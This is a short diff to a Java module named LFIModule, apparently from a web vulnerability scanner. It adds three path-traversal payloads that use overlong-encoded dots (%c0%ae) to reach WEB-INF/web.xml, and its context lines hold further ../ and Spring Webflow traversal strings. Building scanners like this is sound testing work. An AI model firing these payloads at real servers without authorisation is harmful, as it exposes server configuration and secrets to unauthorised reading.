@@ -52,6 +52,9 @@ public class LFIModule implements IModule{
             "../../../WEB-INF/web.xml".getBytes(),
             "../../WEB-INF/web.xml".getBytes(),
             "../WEB-INF/web.xml".getBytes(),
+            "%c0%ae/WEB-INF/web.xml".getBytes(),
+            "%c0%ae/%c0%ae/WEB-INF/web.xml".getBytes(),
+            "%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml".getBytes(),
             // Spring Webflow payloads
             "../../../WEB-INF/web.xml;x=".getBytes(),
             "../../WEB-INF/web.xml;x=".getBytes(),  
